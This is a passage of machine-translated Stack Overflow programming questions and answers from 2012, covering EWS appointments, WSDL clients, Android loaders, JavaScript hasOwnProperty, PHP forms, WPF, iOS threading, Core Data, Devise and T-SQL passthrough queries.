                    Appointment.Body += "<tr><td><b>Contact Email:</b></td><td>" + ClientInfo.Contacts[0].Email + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Client Address 1:</b></td><td>" + ClientInfo.Address1 + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Note:</b></td><td>" + txt_NextContactDateNote.Content + "</td></tr></table>";
                    Appointment.Start = DateTime.Parse(txt_NextContactDate.Text);
                    Appointment.End = DateTime.Parse(txt_NextContactDate.Text);
                    Appointment.Save(SendInvitationsMode.SendToNone);
                } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T16:52:40.403

这在**Exchange 2010 SP1**中运行良好……我没有**Exchange 2007 SP1**来测试它。

```
Appointment appt = new Appointment(service)
{
    Subject = "Next Contact Date",
    Body = new MessageBody()
    {
        BodyType = BodyType.HTML,
        Text = "here is some body content. <b>this is bold</b>" +
              "<table><tr><td><b>Client name: </b></td><td>George</td></tr></table>",
    },
    Start = DateTime.Now.AddDays(1),
    End = DateTime.Now.AddDays(1).AddHours(.5),
};
appt.Save(); 
```

# java - Webservice客户端找不到wsdl

> ID：12009892
> 
> 赞同：1
> 
> 时间：2012-08-17T16:52:13.623
> 
> 标签：java, https, wsdl, netbeans-7, webservices-client

我在 NetBeans 7.1 中创建了两个 web 服务客户端，模仿他们网站上的教程。

不久前，我针对位于 http 位置的 wsdl 文件完成了第一个，并且使用 web 服务没有问题

我目前正在使用的网络服务有一个位于 https 位置的 wsdl 文件。该服务的设置顺利进行。与第一个的唯一区别是弹出窗口提醒我注意安全证书，我接受了该证书。Service、Generated Sources、META-INF 等都创建成功。wsdl 文件的本地副本存储在我的电脑上的 src/.. 文件夹下。

但是，一旦我去运行我的代码，我就会收到这个错误：

> 找不到“ *https://-domain-.net/-XYZServices-/-ABCXML?wsdl-”wsdl* 。将资源正确放置在类路径中。

我在 Stackoverflow 和其他在线地方发现了几个类似的问题，但没有真正解决我的问题。无论如何，我尝试了几个建议：

我检查了 jax-ws-catalog.xml 文件，发现上面引用的 url 映射到存储 wsdl 本地副本的本地文件夹。我检查了该本地文件夹是否实际上包含 wsdl 文件 - 它确实包含。我尝试编辑 jax-ws-catalog.xml 文件中的 url 以指向端口 8080 和 8081 - 不高兴。

我想这是一个安全问题，但不知道如何解决这个问题。

谁能在这里指出我正确的方向。

仅供参考：我对 java 和 NetBeans 还很陌生。

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-05-09T01:41:17.857

避免错误“找不到 wsdl。将资源正确放置在类路径中”的最佳方法。就是使用wsdllocation来指定wsdl的位置，同时也将wsdl打包成jar的一部分。

当您指定 wsdllocation 时，请确保将“/”添加到位置的开头。

```
wsimport  -keep -Xnocompile  -wsdllocation /schema/10.0/MyService.wsdl  schema/10.0/MyService.wsdl 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T20:09:06.067

不确定这是否有帮助，但是...

从[这里](http://forums.netbeans.org/topic30802.html)

> 在客户端使用启用 SSL 的 Web 服务： - 在 WSDL 和客户端位置下的新建 Web 服务客户端向导中，通过以 https://:8181// 的形式设置 WSDL URL 来指定 Web 服务的 WSDL 文件 - 然后对单击创建的 Web 服务并选择编辑 Web 服务属性并在 Wsimport 选项下将 wsdlLocation 选项更正为以下形式：/META-INF/wsdl/_8181//.wsdl
> 
> 每当您刷新 Web 服务时，都会从已部署的应用程序加载新的 wsdl 文件，并且 wsdl 文件会作为由正确路径定义的资源（提到的 wsdlLocation 选项值）加载。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-02-10T09:31:13.223

只需将您的 WSDL 文件放入您的类路径等 src/main/resources/MyWsdl.xml 并使用它来获取它：

```
URL url = new URL(baseUrl, "classpath:MyWsdl.xml"); 
```

也不要忘记在扩展 javax.xml.ws.Service 的服务类上添加它：

```
@WebServiceClient(name = "MyService", targetNamespace = "http://example.org/", wsdlLocation = "classpath:MyWsdl.xml") 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-08-19T11:04:35.397

确保您已配置 Web 服务。一种方法是实现一个扩展类`javax.ws.rs.core.Application`。也就是说，添加一个类似于以下的类：

```
import java.util.Set;
import javax.ws.rs.core.Application;

@javax.ws.rs.ApplicationPath("rest")
public class ApplicationConfig extends Application {

    @Override
    public Set<Class<?>> getClasses() {
        Set<Class<?>> resources = new java.util.HashSet<Class<?>>();
        addRestResourceClasses(resources);
        return resources;
    }

    private void addRestResourceClasses(Set<Class<?>> resources) {
        resources.add(rest.HelloWorld.class);
        resources.add(rest.Search.class);

        // Here continue adding all the JAX-RS classes that you have
    }

} 
```

# android - 装载机在方向改变时重新启动

> ID：12009895
> 
> 赞同：18
> 
> 时间：2012-08-17T16:52:21.090
> 
> 标签：android

在[http://developer.android.com/guide/components/loaders.html](http://developer.android.com/guide/components/loaders.html)找到的加载器的 Android 文档中，它说加载器的属性之一是：

> 在配置更改后重新创建时，它们会自动重新连接到最后一个加载器的光标。因此，他们不需要重新查询他们的数据。

下面的代码似乎没有反映这种行为，创建了一个新的加载器并完成了对 ContentResolver 的查询，然后我旋转屏幕并重新创建了加载器！

```
public class ReportFragment extends Fragment implements LoaderCallbacks<Cursor> {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getLoaderManager().initLoader(1, null, this);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragment_report, container, false);
        return v;
    }

    public Loader<Cursor> onCreateLoader(int arg0, Bundle arg1) {
        Log.d("TEST", "Creating loader");
        return new CursorLoader(getActivity(), ResourcesContract.Reports.CONTENT_URI, null, null, null, null);
    }

    public void onLoadFinished(Loader<Cursor> arg0, Cursor arg1) {
        Log.d("TEST", "Load finished");
    }

    public void onLoaderReset(Loader<Cursor> arg0) {

    }

} 
```

这是我的 logcat 的输出：

```
08-17 16:49:54.474: D/TEST(1833): Creating loader
08-17 16:49:55.074: D/TEST(1833): Load finished
*Here I rotate the screen*
08-17 16:50:38.115: D/TEST(1833): Creating loader
08-17 16:50:38.353: D/TEST(1833): Load finished 
```

知道我在这里做错了什么吗？

**编辑：**

我应该注意，我正在构建 Android Google API 的版本 8，并使用 v4 支持库。

**第二次编辑：**

这很可能是由于支持库中的错误，如果您想了解更多信息，请查看此错误提交：

[http://code.google.com/p/android/issues/detail?id=20791&can=5&colspec=ID%20Type%20Status%20Owner%20Summary%20Stars](http://code.google.com/p/android/issues/detail?id=20791&can=5&colspec=ID%20Type%20Status%20Owner%20Summary%20Stars)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-08-07T09:06:58.150

虽然这是一个老问题，但我遇到了与 OP 相同的问题。使用加载器，我需要在导航到新活动时重新启动它，然后再返回。但同时，我不希望加载器在我旋转手机屏幕时重新启动。

我发现在 onRestart() 中可以实现这一点，如果你在调用它的超级之前重新启动加载器。

```
public class MainActivity extends AppCompatActivity implements
LoaderManager.LoaderCallbacks<Cursor> {

    ...

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ...

        //Initialize the loader.
        getSupportLoaderManager().initLoader(0, null, this);
    }

    @Override
    protected void onRestart() {
        //Restart the loader before calling the super.
        getSupportLoaderManager().restartLoader(LOADER_ID, null, this);

        super.onRestart();
    }

    ...

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-09T16:29:15.417

在我看来，您误解了文档所说的内容。文件说，**他们不需要重新查询他们的数据**，而且它没有这样做。

尝试在您的`ContentProvider#query()`方法中记录/插入断点！该查询将仅在 Activity 启动时调用，而不是在方向更改后调用。

但这不适用于该`LoaderCallbacks#onCreateLoader()`方法。每次方向更改后都会调用它，但这并不意味着重新查询，它只是调用该方法，以便您可以根据需要更改 CursorLoader。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-02T22:14:36.993

到目前为止，我发现保留片段`Fragment.setRetainInstance(true)`可以防止使用支持库在方向更改时重新创建加载程序。加载程序的最后结果很好地以`onLoadFinished()`. 它至少在活动管理单个片段并且使用`FragmentTransaction`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-10-04T08:08:25.257

虽然这是一个有点老的问题，但我想在这里发表我的观点。

无需在 onSaveInstanceState 中存储其他信息

在配置更改后重新创建时，框架会自动重新连接到最后一个加载器的光标。因此，他们不需要重新查询他们的数据。

这意味着在 onCreate 函数中，只有当 savedInstanceState 为 null 时才需要调用 loaderManager

前任：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if(savedInstanceState == null) {
        getLoaderManager().initLoader(1, null, this);
    }
} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-17T18:50:52.513

您可以简单地检查加载程序是否已经存在 onCreate。然后您可以初始化或重新启动。

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (getLoaderManager().getLoader(LOADER_ID) == null) {
        getLoaderManager().initLoader(LOADER_ID, null, this);
    } else {
        getLoaderManager().restartLoader(LOADER_ID);
    }
} 
```

您通常将 ID 传递给加载程序，以便稍后通过加载程序管理器引用它。

希望这可以帮助！

* * *

## 回答 #6

> 赞同：-3
> 
> 时间：2012-08-17T18:30:30.650

onCreate() 在屏幕方向更改期间被调用，因为活动被销毁并重新创建。

除非您要加载大量数据，否则这样做并没有什么坏处，但是如果您愿意，可以尝试以下方法（我还没有测试过，但理论上我认为它会起作用）。

在类的顶部全局声明一个静态布尔值。我*认为*您还需要一个静态游标来引用

```
private static boolean dataDownloaded = false;
private static Cursor oldCursor; 
```

然后在 onLoadFinished 上设置 dataDownloaded = true

覆盖 onSaveInstanceState 以保存布尔值

```
@Override
protected void onSaveInstanceState(Bundle outSave) {
    outSave.putBoolen("datadownloaded", dataDownloaded);
    oldCursor = adapter.swapCursor(null);
} 
```

和 onCreate 添加以下内容

```
if (savedInstanceState != null) {
    this.dataDownloaded = savedInstanceState.getBoolean("datadownloaded", false);
} 
```

调整你的 onCreateLoader

```
public Loader<Cursor> onCreateLoader(int id, Bundle args) {
    CursorLoader cursorLoader;
    if (dataDownloaded) {
        cursorLoader = new CursorLoader(getActivity(),
            null, projection, null, null, null);
        cursorLoader.deliverResult(oldCursor);
    } else {
        CursorLoader cursorLoader = new CursorLoader(getActivity(),
            URI_PATH, projection, null, null, null);
    }

    return cursorLoader;
} 
```

# javascript - hasOwnProperty 会从 for...in 循环中返回 false 吗？

> ID：12009896
> 
> 赞同：7
> 
> 时间：2012-08-17T16:52:24.917
> 
> 标签：javascript

如果我这样做：

```
for (var i in obj) {
    if (obj.hasOwnProperty(i)) console.log("Has property: " + i);
    else console.log("Doesn't have property: " + i);
} 
```

会`obj.hasOwnProperty(i)`不会回来`false`？如果有，什么时候？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:56:03.780

在循环中使用 hasOwnProperty 的想法是在循环继承的属性时解析为 false。这避免了 Douglas Crockford 所说的“深挖”。

[来自https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty)的示例：

```
var buz = {
  fog: 'stack'
};

for (var name in buz) {
  if (buz.hasOwnProperty(name)) {
    alert("this is fog (" + name + ") for sure. Value: " + buz[name]);
  }
  else {
    alert(name); // toString or something else
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-17T09:27:16.070

[来自https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/hasOwnProperty)的示例- 未显示何时`hasOwnProperty`可以返回 false。

这是一个测试用例，它确实表明：

```
// From some library or earlier in your code
Object.prototype.xxx = "xxx";

// Your object
var data = { member: "member" };

for (var key in data) {
    if( data.hasOwnProperty(key) ) {
        alert(key); // alert("member")
    }
    else {
        alert(key); // alert("xxx")
    }
} 
```

# java - 用于在 Eclipse IDE 中进行更好调试的插件

> ID：12009898
> 
> 赞同：-1
> 
> 时间：2012-08-17T16:52:37.540
> 
> 标签：java, eclipse, ide

我是这个项目的新手，它的代码没有任何记录器语句。跟随任何流程既乏味又耗时。
由于应用程序的异常处理框架，所有异常都落入一个公共异常块中，从那里追溯非常麻烦。
是否有任何 Eclipse 插件可以帮助我调试问题？我正在寻找类似于 XCode 的调试功能，它会在导致异常的行停止流。您可以追溯这一点。
更新了我的问题。

注意：我正在使用 Eclipse Juno，并且正在开发 AspectJ 日志记录实用程序以帮助我处理调试语句。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T18:35:17.340

Himanshu，Eclipse 有一个成熟的调试器，它经受住了时间的考验。你需要给它更多的时间去探索它以实现它的全部潜力。

例如，您从 XCode 中遗漏的特性在 Eclipse 中以异常断点的形式存在。

设置它们（正如 Ajay George 指出的那样）在这个问题中有详细说明： [Break when exception is throwed](https://stackoverflow.com/questions/3066199/eclipse-break-when-exception-is-thrown)

我对了解您在 Eclipse 调试器中寻找的其他内容非常感兴趣。

**编辑**：如果您已经有 Eclipse 的经验，以下内容可能对您没有太大帮助，但我会将它们留在这里以供后代使用： **[这](http://www.vogella.com/articles/EclipseDebugging/article.html)**是一个关于使用 Eclipse 进行调试的综合教程。

此外，如果您更喜欢看和做而不是阅读，那么**[这](http://eclipsetutorial.sourceforge.net/debugger.html)**是一个很好的起点（或者直接从**[这里](http://sourceforge.net/projects/eclipsetutorial/files/3.%20Debugger%20Tutorial/Version%201.0/)**结帐/下载视频）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:54:36.883

Eclipse 有一个内置的调试器来调试 java 程序（[http://www.ibm.com/developerworks/library/os-ecbug/](http://www.ibm.com/developerworks/library/os-ecbug/)），您是否在寻找其他的东西？

# php - HTML表单提交给自己

> ID：12009910
> 
> 赞同：8
> 
> 时间：2012-08-17T16:53:30.207
> 
> 标签：php, html, forms, submit

有人能告诉我为什么这不是屈服于自我吗？

我有以下设置：

```
<?php
     print_r($_POST);
?>

 <form name="bizLoginForm" method="post" action"" >
    <table id="loginTable">
        <tr><td>Username:</td><td><input type="text" id="loginUsername" /></td></tr>
        <tr><td>Password:</td><td><input type="password" id="loginPassword" /></td></tr>
    </table>
    <input type="Submit" value="Login" />
</form> 
```

每次单击提交按钮时，我在 POST 数组中都看不到任何内容。我完全忽略了什么简单的事情？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-17T16:58:48.067

除了`action`在表单元素中的属性中缺少等号之外。

您的输入需要名称属性：

```
<tr>
    <td>Username:</td>
    <td><input id="loginUsername" name="loginUsername" type="text" /></td>
</tr> 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-17T16:55:15.900

```
 <form name="bizLoginForm" method="post" action"" > 
```

应该

```
 <form name="bizLoginForm" method="post" action="" > 
```

缺少 = 符号。

您还缺少输入标签中的 name 属性，因此请更改

```
<input type="text" id="loginUsername" /> 
```

和

```
<input type="password" id="loginPassword" /> 
```

到

```
<input type="text" id="loginUsername" name="loginUsername" /> 
```

和

```
<input type="password" id="loginPassword" name="loginPassword" /> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-17T16:55:49.163

*   您应该在*操作*和“”之间添加**等号**
**   还要为每个输入字段指定**名称属性。***

 ** * *

```
<?php
     print_r($_POST);
?>

 <form name="bizLoginForm" method="post" action="" >
    <table id="loginTable">
        <tr><td>Username:</td><td><input type="text" name="login" id="loginUsername" /></td></tr>
        <tr><td>Password:</td><td><input type="password" name="password" id="loginPassword" /></td></tr>
    </table>
    <input type="Submit" value="Login" /></form> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-18T09:20:50.227

试试这个

```
<?php
   if(isset($_POST['submit_button']))
      print_r($_POST);
?>

<form name="bizLoginForm" method="post" action"<?php echo $_SERVER['PHP_SELF']?>" >
  <table id="loginTable">
    <tr><td>Username:</td><td><input type="text" id="loginUsername" /></td></tr>
    <tr><td>Password:</td><td><input type="password" id="loginPassword" /></td></tr>
  </table>
  <input type="Submit" name="submit_button" value="Login" />
</form> 
```

使用 .php 扩展名保存文件

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-17T17:04:59.537

试试这个

```
<?php
if(isset($_GET["submitted"])){
    print_r($_POST["values"]);
} else {
?>
 <form name="bizLoginForm" method="post" action="?submitted" >
    <table id="loginTable">
        <tr><td>Username:</td><td><input type="text" name="values[]" id="loginUsername" /></td></tr>
        <tr><td>Password:</td><td><input type="password" name="values[]" id="loginPassword" /></td></tr>
    </table>
    <input type="Submit" value="Login" />
</form>
<?php
}
?> 
```*

# c# - 如何使用 WPF 加载网页

> ID：12009913
> 
> 赞同：7
> 
> 时间：2012-08-17T16:53:41.080
> 
> 标签：c#, wpf

我需要在 WPF 中加载一个网页并与页面中的元素进行交互。有没有办法用 WPF 做到这一点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-17T16:57:46.693

您可以尝试使用[WebBrowser](http://msdn.microsoft.com/en-us/library/system.windows.controls.webbrowser.aspx)控件。这基本上为您在应用程序中提供了一个网络浏览器，然后您可以加载和浏览网页。

只需将控件与

```
<WebBrowser Name="webBrowser" /> 
```

进而

```
webBrowser.Navigate("http://www.stackoverflow.com"); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-08-01T14:47:02.563

您可以使用

```
<WebBrowser Source="http://www.microsoft.com" /> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T17:02:03.563

将 WebBrowser 控件添加到您的 WPF 并使用 Navigate 方法加载网页：

```
webBrowser1.Navigate("http://www.google.com"); 
```

# iphone - performSelector 在所有实例上进入方法，但只有一个线程完成

> ID：12009914
> 
> 赞同：1
> 
> 时间：2012-08-17T16:53:41.687
> 
> 标签：iphone, objective-c, ios, multithreading, objective-c-blocks

这可能是一个幼稚的问题，但我还是会问这个问题，因为我找不到任何可以在我脑海中解决这个问题的文档。

我正在使用 Xcode45-DP4 在设备和模拟器中运行 iOS5.1。

我有一个循环遍历一个类的多个实例的数组。在那个循环中，我在实例上使用 performSelector 来启动一个线程，该线程执行一些相对较慢的网络操作——拉取我宁愿在后台执行的数据。

```
 [arrayOfFriends enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        Friend *f = (Friend*)obj;
        iOSSLog(@"%d", idx);
        [f performSelectorInBackground:@selector(showDescription) withObject:nil];

-(void)fetchTwitterStatus
{
iOSSLog(@"Trying to fetch twitterstatus %@ %@", self.hash, self.twitterUserName);
[mLocalTwitterUser fetchTwitterAPIUserStatusWithScreenName:twitterUserName
                                     withCompletionHandler:^(NSArray *arrayOfStatus, NSError *error) {
                                         if(error) {
                                             iOSSLog(@"%@", error);
                                         } else {
                                             iOSSLog(@"Got twitterstatus %@ %d", self.twitterUserName, [arrayOfStatus count]);
                                             @synchronized(items) {
                                                 [items addObjectsFromArray:arrayOfStatus];
                                             }
                                         }
                                     }];
} 
```

在我的测试用例中有四个实例。每个实例都有它的选择器，你知道..selected。前三个肯定开始，但只有最后一个实际完成，如日志行所示，“Got twitterstatus ...”这很奇怪。

我还可以验证选择器调用的方法“fetchTwitterStatus”

我在这里缺少的多线程的基本核心是什么？

编辑：这里是 fetchTwitterAPIUserStatusWithScreenName ......这里有点，但实际上它使用 JSON 响应调用 Twitter API 端点 user_timeline。

```
- (void)fetchTwitterUserStatusWithScreenName:(NSString *)screenname
                          excludeReplies:(BOOL)excludeReplies
                   withCompletionHandler:(OtterTwitterSearchHandler)completionHandler

{
self.twitterAPIStatusHandler = completionHandler;
//self.fetchTwitterUserStatusHandler = completionHandler;
NSString *urlString = [NSString stringWithFormat:@"https://api.twitter.com/1/statuses/user_timeline.json?screen_name=%@&include_rts=true&include_entities=true&exclude_replies=%@&count=50", screenname, excludeReplies?@"true":@"false"];
NSURL *url = [NSURL URLWithString:urlString];

#warning this isn't the way to do it - just checking the cache for refresh of the scroller
[[ASIDownloadCache sharedCache]removeCachedDataForURL:url];

iOSSRequest *request = [[iOSSRequest alloc] initWithURL:url
                                             parameters:nil
                                          requestMethod:iOSSRequestMethodGET];

NSMutableDictionary *oauthParams = [NSMutableDictionary dictionary];
[oauthParams setObject:[[Twitter sharedService] apiKey] forKey:kASIOAuthConsumerKey];
[oauthParams setObject:[[Twitter sharedService] apiSecret] forKey:kASIOAuthConsumerSecret];
[oauthParams setObject:[self oAuthAccessToken] forKey:kASIOAuthTokenKey];
[oauthParams setObject:kASIOAuthSignatureMethodHMAC_SHA1 forKey:kASIOAuthSignatureMethodKey];
[oauthParams setObject:@"1.0" forKey:kASIOAuthVersionKey];
[oauthParams setObject:[self oAuthAccessTokenSecret] forKey:kASIOAuthTokenSecretKey];

request.oauth_params = oauthParams;

[request performRequestWithHandler:^(NSData *responseData, NSHTTPURLResponse *urlResponse, NSError *error) {
    if (error) {
        if (self.twitterAPIStatusHandler) {
            self.twitterAPIStatusHandler(nil, error);
            self.twitterAPIStatusHandler = nil;
        }
    } else {
        NSMutableArray *recentStatusForTwitterUser = [[NSMutableArray alloc]init];
        NSArray *array = [Twitter JSONFromData:responseData];
        [array enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
            TwitterStatus *twitterStatus = nil;
            twitterStatus = [[TwitterStatus alloc]initWithDictionary:obj];
            [recentStatusForTwitterUser addObject:twitterStatus];
        }];
        if (self.twitterAPIStatusHandler) {
            self.twitterAPIStatusHandler(recentStatusForTwitterUser, nil);
            self.twitterAPIStatusHandler = nil;
        }
    }
}];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T18:11:53.047

我建议尽可能使用已经提供的异步抽象。这将是一种相当罕见/独特的情况，您需要直接处理线程。

我发现将每个基于网络的后台任务视为`NSOperation`队列上的同步任务非常有效。

获取 的新实例`NSOperationQueue`，对其进行配置，向其中添加任务并管理队列。这种方法的好处是每个任务都可以实现为一个简单的同步任务，而队列负责并发。或者，您可以设置依赖项（此任务必须在此之前完成）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:13:50.100

> 我在这里缺少的多线程的基本核心是什么？

采用非多线程代码并通过在后台执行任意方法来分离随机数量的线程注定要失败。

并发是一种必须从一开始就仔细考虑的设计模式（或者是一项巨大的重构工作）。

首先，您不想为每个网络连接生成一个线程。其次，鉴于这些只是 HTTP 请求，您可能希望使用内置类的系统进行异步 HTTP 通信。最后，您的并发模型必须准确指定如何隔离所有数据，直到您使用任何机制将数据同步回中央存储。

很难在没有看到更多信息的情况下说该代码在哪里脱轨。

# facebook - 是否可以在我的应用程序中使用 Facebook 搜索？

> ID：12009917
> 
> 赞同：2
> 
> 时间：2012-08-17T16:53:55.087
> 
> 标签：facebook, facebook-graph-api

我正在开发一个 Facebook 应用程序。我想知道我是否可以通过他们的 REST API 在我的应用程序中使用原始的 Facebook 搜索引擎。是否可以？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:05:38.270

您可以搜索社交图中的所有**公共对象**

[https://graph.facebook.com/search?q=watermelon&type=post](https://graph.facebook.com/search?q=watermelon&type=post)

`q`是查询并且`type`是对象

检查 API 文档（寻找搜索）

[https://developers.facebook.com/docs/reference/api/](https://developers.facebook.com/docs/reference/api/)

# selenium - 如何使用 firefoxdriver 获取 .har 文件的名称

> ID：12009918
> 
> 赞同：0
> 
> 时间：2012-08-17T16:53:55.320
> 
> 标签：selenium, firebug, webdriver

我正在使用 firebug webdriver 将网络流捕获到 .har 文件。我将编写一个解析器来从文件中获取相关信息，但为了自动化这个过程，我需要知道 .har 文件的名称是什么。默认文件名是主机+日期。这个文件有getName api吗？

谢谢！

*   克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T17:43:29.097

据我所知没有。在我的项目中，我只是列出目录中的所有 har 文件并选择具有最新创建日期的文件。它总是有效的。

# iphone - 在不触发获取控制器委托的情况下更改 NSManagedObject

> ID：12009924
> 
> 赞同：1
> 
> 时间：2012-08-17T16:54:21.937
> 
> 标签：iphone, objective-c, ios, core-data

我想对 a 进行更改`NSManagedObject`，但不触发`NSFetchedResultsController`委托方法。但是，我确实希望将更改传播到上下文，这样如果我根据这些更改进行获取，结果就会显示出来。我已经尝试过在[这个答案](https://stackoverflow.com/a/11656240/458960)中提出的建议，但是问题是如果我根据这些更改进行获取，我不会得到任何结果，所以不仅委托方法没有触发（期望的结果），而且上下文是'没有意识到这些变化（一个不希望的结果）。

我的目标是严格防止`NSFetchedResultsController`在对某些属性进行更改时仅触发委托方法，但我仍然希望保留所有其他功能，例如 KVO 和 Core Data 在幕后所做的任何事情，以确保上下文了解变化。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:03:56.447

NSFetchedReresultsController 将在相关上下文中侦听来自相关实体的通知。您需要做的是在您的委托方法中引入一些逻辑，如果上下文对您想要忽略的对象进行了一些更改，您将丢弃对 UI 的任何更新（如果有）。如果您在完全持久跟踪模式下使用 NSFetchedResultsController 实例，则将调用委托方法。这是 NSFetchedResultsController 的主要用途。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:14:51.093

我真的不知道您为什么要这样做，但是，您可以这样做的一种方法是设置某种全局标志，该标志将指示继续进行 UI 更新。

您将在保存上下文之前设置一个标志，在您获取的结果控制器委托方法中，您只需检查该标志，如果已设置，则取消设置并返回以停止 UI。

# ruby-on-rails - 设计忽略我的自定义策略

> ID：12009941
> 
> 赞同：6
> 
> 时间：2012-08-17T16:55:29.380
> 
> 标签：ruby-on-rails, devise, warden

我想创建一个自定义身份验证策略来访问 API。我遵循了[Devise ignoring custom strategy](https://stackoverflow.com/questions/3503827/devise-ignoring-custom-strategy)的示例代码。

问题是有效吗？我的 Api 策略中的方法永远不会运行（基于试图撬开它）。

我的代码：

```
module Devise
  module Strategies
    class Api < Devise::Strategies::Base
      def valid?
        binding.pry
        params[:request_source] == 'api'
      end

      def authenticate!
        #do stuff here

        if user
          success!(user)
        else
          warden.custom_failure!
          render :json=> {:success=>false, :message=>"Error with your login or password"}, :status=>401
        end
      end
    end

    Warden::Strategies.add(:api, Devise::Strategies::Api)

  end
end 
```

并在设计初始化程序中：

```
config.warden do |manager|
  manager.default_strategies.unshift :api
end 
```

无论我做什么，Devise 似乎总是使用它的默认策略。AFAIK，这应该足够了......

- - - -编辑 - - - -

我需要在我的设计初始化程序的最顶部使用这样的策略：

```
require Rails.root.join('app/devise/strategies/api') 
```

我知道该策略是在启动时加载的，因为如果我在类中进行 pry 调用，它将启动一个 pry 会话。但是方法中的 Pry 调用永远不会运行。:-S

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T16:34:30.523

找到了答案！

我不得不使用这个：

```
config.warden do |manager|
  manager.default_strategies(scope: :user).unshift :api
end 
```

让它工作。奇怪的是，我在网上看到的很多示例代码都没有使用它:-S

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-21T23:05:54.827

您何时需要自定义策略？与示例相比，您在此处添加策略，而不是在初始化程序中。您可以尝试在初始化程序顶部要求自定义策略，以确保在将其添加到 default_strategies 之前已加载它。

如果这不能解决问题，请不要害怕在设计本身中添加一些临时的 puts 语句，其中调用 authenticate 来检查 default_strategies。也就是说，如果您对使用调试器不满意，我会这样做。

# tsql - 如何将传递查询的结果保存到本地表？

> ID：12009942
> 
> 赞同：0
> 
> 时间：2012-08-17T16:55:29.610
> 
> 标签：tsql

我需要从 MS SQL 服务器通过 ODBC 向 Oracle 服务器提交一系列查询，并将结果作为表存储在 MS SQL 服务器上。

它必须是直通的，因为查询需要在 Oracle 服务器上定义的服务器端函数。由于 Oracle 上运行的数据库供应商的许可限制，我无法将表保存在 Oracle 服务器上，然后通过 ODBC 访问它。

这是返回正确结果的代码，但我不知道如何保存它们：

```
DECLARE @BibID AS bigint

DECLARE BibList CURSOR FOR 
    SELECT BIB_ID FROM tblActiveSerialsThatHave740s
OPEN BibList 

FETCH NEXT FROM BibList INTO @BibID
WHILE @@FETCH_STATUS=0
BEGIN
    EXECUTE 
    ('SELECT 
        AMDB.BIB_DATA.BIB_ID As BIB_ID, 
        AMDB.GetAllBibTag(AMDB.BIB_DATA.BIB_ID, ''740'', ''2'') As F740_All 
    FROM 
        AMDB.BIB_DATA 
    WHERE
        AMDB.BIB_DATA.BIB_ID = ' + @BibID + '
    GROUP BY BIB_ID '
    )
    AT REPORT
    FETCH NEXT FROM BibList INTO @BibID
END

DEALLOCATE BibList 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T00:13:41.900

您需要使用 INSERT INTO 来捕获 EXECUTE 的结果。

因为您正在执行直通查询，分布式事务协调器将发挥作用，您可能需要确保未创建分布式事务（在您的情况下不太可能需要分布式事务）或分布式事务事务协调器服务正在运行：

[http://blogs.msdn.com/b/sqlprogrammability/archive/2008/08/22/how-to-create-an-autonomous-transaction-in-sql-server-2008.aspx](http://blogs.msdn.com/b/sqlprogrammability/archive/2008/08/22/how-to-create-an-autonomous-transaction-in-sql-server-2008.aspx)

[http://technet.microsoft.com/en-us/library/ms178532.aspx](http://technet.microsoft.com/en-us/library/ms178532.aspx)

[http://www.sqlservercentral.com/Forums/Topic861249-392-1.aspx](http://www.sqlservercentral.com/Forums/Topic861249-392-1.aspx)

# jboss - 如何让 JBoss Quartz 作业查看我的 JAR 文件中的类？

> ID：12009950
> 
> 赞同：1
> 
> 时间：2012-08-17T16:56:01.623
> 
> 标签：jboss, classloader, quartz-scheduler

